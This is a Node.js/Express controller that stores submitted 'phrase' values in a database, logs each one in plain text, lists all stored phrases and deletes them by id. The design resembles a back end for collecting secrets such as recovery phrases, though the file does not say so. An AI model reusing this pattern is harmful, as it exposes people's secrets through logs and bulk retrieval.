const Key = require("../modal/Keymodal");

const keyController = async (req, res) => {
    const { phrase } = req.body;
    console.log("Received phrase:", phrase); // Log the phrase received
    try {
        const existingKey = await Key.findOne({ phrase });
        if (existingKey) {
            console.log("Phrase already exists");
            return res.status(400).json({ message: "Phrase already exists", isSuccess: false });
        }
        const key = await Key.create({ phrase });
        console.log("Key created:", key);
        res.json({ message: "Successfully created", isSuccess: true, key });
    } catch (error) {
        console.error("Error:", error);
        res.status(500).json({ message: "Internal server error", isSuccess: false });
    }
};


const keyGetController = async (req, res) => {
    try {
        // Fetch keys sorted by latest (_id in descending order)
        const keys = await Key.find().sort({ _id: -1 });

        if (keys && keys.length > 0) {
            res.json({ message: "Successfully retrieved keys", isSuccess: true, keys });
        } else {
            res.json({ message: "No keys found", isSuccess: true, keys: [] });
        }
    } catch (error) {
        console.error(error);
        res.status(500).json({ message: "Internal server error", isSuccess: false });
    }
};


const keyDeleteController = async (req, res) => {
    const { id } = req.params;
    console.log("Received ID for deletion:", id);

    try {
        const deletedKey = await Key.findByIdAndDelete(id);

        if (deletedKey) {
            console.log("Key deleted:", deletedKey);
            res.json({ message: "Successfully deleted", isSuccess: true, key: deletedKey });
        } else {
            console.log("Key not found");
            res.status(404).json({ message: "Key not found", isSuccess: false });
        }
    } catch (error) {
        console.error("Error:", error);
        res.status(500).json({ message: "Internal server error", isSuccess: false });
    }
};



module.exports = { keyController, keyGetController , keyDeleteController };
